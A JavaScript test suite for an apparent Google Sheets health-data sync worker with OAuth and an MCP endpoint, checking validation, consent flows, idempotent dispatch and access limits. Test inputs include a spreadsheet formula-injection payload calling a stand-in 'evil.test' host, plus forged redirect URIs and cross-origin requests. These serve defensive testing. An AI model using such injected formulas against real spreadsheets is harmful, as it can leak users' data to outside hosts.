import test from 'node:test';
import assert from 'node:assert/strict';
import { SyncState, commandInput, dateRange } from '../dist-test/sync-state.mjs';
import { GoogleAuthHandler } from '../dist-test/google-auth.mjs';
import { mcpHandler } from '../dist-test/mcp-server.mjs';
import { Sheets } from '../dist-test/sheets.mjs';
import { hash, canonical, cookie } from '../dist-test/security.mjs';

function storage() {
  const map=new Map(); let chain=Promise.resolve();
  const s={
    get:async k=>structuredClone(map.get(k)),
    put:async(k,v)=>{map.set(k,structuredClone(v));},
    delete:async k=>map.delete(k),setAlarm:async()=>{},deleteAll:async()=>map.clear(),
    transaction:async fn=>{const p=chain.then(()=>fn(s));chain=p.catch(()=>{});return p;}
  };
  return s;
}
const env={ALLOWED_GOOGLE_EMAIL:'owner@example.test',SPREADSHEET_ID:'test-spreadsheet-123456789',
  PUBLIC_ORIGIN:'https://worker.example.test',GOOGLE_CLIENT_ID:'client',GOOGLE_CLIENT_SECRET:'secret',SYNC_ENABLED:'true'};
const props={authVersion:2,sub:'owner',email:'owner@example.test',accessToken:'access-secret',accessTokenExpiresAt:Date.now()+3600000};
const raw='{"weight_kg":80,"datetime":"2026-11-06T10:00:00+03:00"}';
const row=['command_001','log_weight',raw,true];
function setup(rows=[row]) {
  const s=storage(), state=new SyncState({storage:s},env),statuses=[];
  const sheets={read:async()=>structuredClone(rows),commandStatus:async(...a)=>statuses.push(a[3])};
  return {s,state,sheets,statuses};
}
test('input rejects arbitrary tools, secrets, nonnumeric values and missing timezone',()=>{
  for(const [tool,value] of [['delete_log',raw],['log_weight','{"weight_kg":80,"client_secret":"x"}'],
    ['log_weight','{"weight_kg":"80","datetime":"2026-11-06T10:00:00Z"}'],
    ['log_weight','{"weight_kg":80,"datetime":"2026-11-06T10:00:00"}']]) {
    assert.throws(()=>commandInput(tool,value));
  }
  assert.equal(commandInput('log_weight',raw).weight_kg,80);
  assert.throws(()=>dateRange('2026-02-30','2026-03-01'));
  assert.throws(()=>dateRange('2026-11-01','2026-11-08'));
});
test('flow is browser-bound, expires, requires consent and is consumed exactly once',async()=>{
  const {state}=setup(),body={browserHash:'browser',expires:Date.now()+600000,info:{clientId:'client'}};
  assert.equal((await state.flow('/flow/create',body)).ok,true);
  assert.equal((await state.flow('/flow/consume',{browserHash:'browser'})).ok,false);
  assert.equal((await state.flow('/flow/start',{browserHash:'attacker',verifier:'v'})).ok,false);
  assert.equal((await state.flow('/flow/start',{browserHash:'browser',verifier:'v'})).ok,true);
  const attempts=await Promise.all([1,2,3].map(()=>state.flow('/flow/consume',{browserHash:'browser'})));
  assert.equal(attempts.filter(r=>r.ok).length,1);
  assert.equal(attempts.find(r=>r.ok).verifier,'v');
  const expired=setup();
  assert.equal((await expired.state.flow('/flow/create',{...body,expires:Date.now()-1})).ok,false);
});
test('callback rejects forged state without contacting Google',async t=>{
  const before=globalThis.fetch; t.after(()=>globalThis.fetch=before);
  let calls=0;globalThis.fetch=async()=>{calls++;throw Error('must not run');};
  const fakeEnv={...env,SYNC_STATE:{idFromName:n=>n,get:()=>({fetch:async()=>Response.json({ok:false})})}};
  const r=await GoogleAuthHandler.fetch(new Request(env.PUBLIC_ORIGIN+'/callback?state='+'a'.repeat(43)+'&code=private',{
    headers:{cookie:cookie('browser')}
  }),fakeEnv);
  assert.equal(r.status,400);assert.equal(calls,0);assert.ok(!(await r.text()).includes('private'));
});
test('OAuth requires exact trusted redirect and S256 before Google access',async()=>{
  const request=new Request(env.PUBLIC_ORIGIN+'/authorize');
  let allocated=0;
  const fakeEnv={...env,ALLOWED_REDIRECT_URIS:'["https://chat.example.test/callback"]',
    SYNC_STATE:{idFromName:n=>n,get:()=>({fetch:async()=>{allocated++;return Response.json({ok:true});}})},
    OAUTH_PROVIDER:{parseAuthRequest:async()=>({clientId:'c',redirectUri:'https://evil.test/callback',codeChallenge:'a',codeChallengeMethod:'S256'}),
      lookupClient:async()=>({redirectUris:['https://evil.test/callback']})}
  };
  assert.equal((await GoogleAuthHandler.fetch(request,fakeEnv)).status,400);
  assert.equal(allocated,0);
});
test('consent rejects cross-origin POST before reading flow',async()=>{
  const r=await GoogleAuthHandler.fetch(new Request(env.PUBLIC_ORIGIN+'/consent',{method:'POST',
    headers:{origin:'https://evil.test'},body:'flow=x'}),{...env,SYNC_STATE:{}});
  assert.equal(r.status,400);
});
test('queue dispatches once, preserves ACCEPTED, and reprojects after lost Sheets response',async t=>{
  const before=globalThis.fetch;t.after(()=>globalThis.fetch=before);
  let posts=0;globalThis.fetch=async()=>{posts++;return Response.json({name:'operations/op1',done:false});};
  const {state,sheets,statuses}=setup();
  let fail=true;const write=sheets.commandStatus;
  sheets.commandStatus=async(...a)=>{if(fail){fail=false;throw Error('SHEETS_HTTP_503');}return write(...a);};
  await assert.rejects(()=>state.process(sheets,props,[row]));
  await state.process(sheets,props,[row]);
  assert.equal(posts,1);assert.equal(statuses.at(-1).status,'ACCEPTED');
});
test('ambiguous POST is never retried',async t=>{
  const before=globalThis.fetch;t.after(()=>globalThis.fetch=before);
  let posts=0;globalThis.fetch=async()=>{posts++;throw Error('connection lost access-secret');};
  const {state,sheets,statuses}=setup();
  await state.process(sheets,props,[row]);await state.process(sheets,props,[row]);
  assert.equal(posts,1);assert.equal(statuses.at(-1).status,'NEEDS_REVIEW');
  assert.ok(!JSON.stringify(statuses).includes('access-secret'));
});
test('crash after reservation becomes NEEDS_REVIEW without dispatch',async t=>{
  const before=globalThis.fetch;t.after(()=>globalThis.fetch=before);
  globalThis.fetch=async()=>{throw Error('unexpected POST');};
  const {state,s,sheets,statuses}=setup();
  await s.put('command:'+await hash(env.SPREADSHEET_ID+':'+row[0]),{
    hash:await hash(canonical({tool:row[1],args:commandInput(row[1],row[2])})),status:'IN_FLIGHT',attempts:1
  });
  await state.process(sheets,props,[row]);
  assert.equal(statuses.at(-1).status,'NEEDS_REVIEW');
});
test('same ID with different payload is a conflict, duplicate IDs block whole batch',async t=>{
  const before=globalThis.fetch;t.after(()=>globalThis.fetch=before);
  let posts=0;globalThis.fetch=async()=>{posts++;return Response.json({done:false});};
  const a=setup();await a.state.process(a.sheets,props,[row]);
  const changed=[...row];changed[2]=raw.replace('80','81');
  const sheets={read:async()=>[changed],commandStatus:async(...args)=>a.statuses.push(args[3])};
  await a.state.process(sheets,props,[changed]);
  assert.equal(a.statuses.at(-1).status,'CONFLICT');assert.equal(posts,1);
  const b=setup([row,row]);
  await assert.rejects(()=>b.state.process(b.sheets,props,[row,row]),/INVALID_COMMAND_IDS/);
  assert.equal(posts,1);
});
test('completed first ten rows do not starve later queued commands',async t=>{
  const before=globalThis.fetch;t.after(()=>globalThis.fetch=before);
  let posts=0;globalThis.fetch=async()=>{posts++;return Response.json({done:false});};
  const rows=Array.from({length:11},(_,i)=>['command_'+String(i).padStart(3,'0'),row[1],row[2],true]);
  const a=setup(rows);await a.state.process(a.sheets,props,rows);assert.equal(posts,10);
  await a.state.process(a.sheets,props,rows);assert.equal(posts,11);
});
test('unapproved commands are ignored',async t=>{
  const before=globalThis.fetch;t.after(()=>globalThis.fetch=before);
  globalThis.fetch=async()=>{throw Error('unexpected POST');};
  const unapproved=[...row];unapproved[3]=false;
  const a=setup([unapproved]);await a.state.process(a.sheets,props,[unapproved]);
  assert.equal(a.statuses.length,0);
});
test('old grants and other owners are denied before reading Health',async()=>{
  for(const p of [{...props,authVersion:1},{...props,email:'other@example.test'}]){
    const r=await mcpHandler.fetch(new Request(env.PUBLIC_ORIGIN+'/mcp',{method:'POST',body:'{}'}),{...env,SYNC_STATE:{}},{props:p});
    assert.equal(r.status,403);
  }
});
test('MCP exposes only reads and queued sync; direct mutations are unavailable',async()=>{
  const r=await mcpHandler.fetch(new Request(env.PUBLIC_ORIGIN+'/mcp',{method:'POST',
    body:JSON.stringify({jsonrpc:'2.0',id:1,method:'tools/list'})}),{...env,SYNC_STATE:{}},{props});
  const data=await r.json();const names=data.result.tools.map(t=>t.name);
  assert.ok(names.includes('sync_sheets'));assert.ok(!names.includes('log_weight'));assert.ok(!names.includes('delete_log'));
});
test('RAW Sheets writes cannot evaluate injected formulas',async t=>{
  const before=globalThis.fetch;t.after(()=>globalThis.fetch=before);
  const calls=[];globalThis.fetch=async(url,init)=>{calls.push({url,body:JSON.parse(init.body)});return Response.json({});};
  const sheets=new Sheets(env,props);sheets.token='access-secret';
  await sheets.write('Records','A2:E2',[['=IMPORTXML("https://evil.test")']]);
  assert.match(calls[0].url,/valueInputOption=RAW/);
});
test('run lock rejects concurrent invocation and tokens are not persisted',async()=>{
  const {state,s}=setup();let release;const pending=new Promise(r=>release=r);
  state.run=async()=>{await pending;return {status:'SUCCEEDED'};};
  const req=()=>new Request('https://internal/sync',{method:'POST',body:JSON.stringify({props,start_date:'2026-11-06',end_date:'2026-11-06'})});
  const first=state.fetch(req());
  await new Promise(r=>setImmediate(r));
  const second=await state.fetch(req());assert.equal((await second.json()).error,'SYNC_BUSY');
  assert.ok(!JSON.stringify(await s.get('lease')).includes('access-secret'));
  release();await first;assert.equal(await s.get('lease'),undefined);
});
